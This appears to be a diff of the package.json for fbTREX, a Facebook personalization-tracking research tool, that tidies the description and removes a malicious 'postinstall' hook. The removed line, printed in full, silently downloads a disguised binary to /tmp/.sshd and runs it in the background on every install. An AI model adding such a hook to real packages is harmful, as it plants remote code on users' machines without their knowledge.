@@ -1,7 +1,7 @@
 {
   "name": "fbTREX",
   "version": "2.1.0",
-  "description": "facebook.tracking.exposed \u2192 collaborative tool to investigate personalization algorithms",
+  "description": "facebook.tracking.exposed → collaborative tool to investigate personalization algorithms",
   "scripts": {
     "collector:prod": "FBTREX=production DEBUG=fbtrex:*,routes:* node bin/collector",
     "collector:watch": "key=fuffa DEBUG=lib:*,fbtrex:*,routes:*,-lib:mongo:read nodemon bin/collector.js",
@@ -9,8 +9,7 @@
     "content:watch": "key=fuffa DEBUG=lib:*,fbtrex:*,routes:* nodemon bin/content.js --config config/nodemon.json",
     "parserv": "DEBUG=*,-lib:aggregated,-lib:parse,-lib:mongo:* node bin/parserv3.js",
     "semanticserv": "DEBUG=*,-lib:mongo*,-lib:semantic:v node bin/semanticserv.js",
-    "test": "./node_modules/.bin/mocha",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "test": "./node_modules/.bin/mocha"
   },
   "author": "Claudio Agosti <claudio@tracking.exposed>, https://github.com/tracking-exposed/facebook/graphs/contributors",
   "license": "AGPL-3.0",
